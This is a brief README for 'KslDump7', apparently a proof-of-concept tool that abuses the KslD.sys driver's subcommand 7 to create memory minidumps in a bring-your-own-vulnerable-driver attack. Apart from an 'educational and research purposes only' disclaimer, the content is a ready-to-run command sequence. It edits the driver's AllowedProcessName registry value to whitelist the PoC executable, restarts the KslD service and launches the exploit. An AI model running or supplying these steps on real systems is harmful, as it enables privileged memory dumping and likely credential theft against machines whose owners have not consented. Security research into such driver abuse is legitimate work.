# KslDump7
For educational and research purposes only.

This code use SubCmd 7 not 2+12. (KslD.sys)

We have already been "BYOVD"ed.

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Services\KslD /v AllowedProcessName /t REG_SZ /d "\Device\HarddiskVolume3\path\to\poc_subcmd7_minidump.exe" /f
sc stop KslD
sc start KslD
poc.exe
```
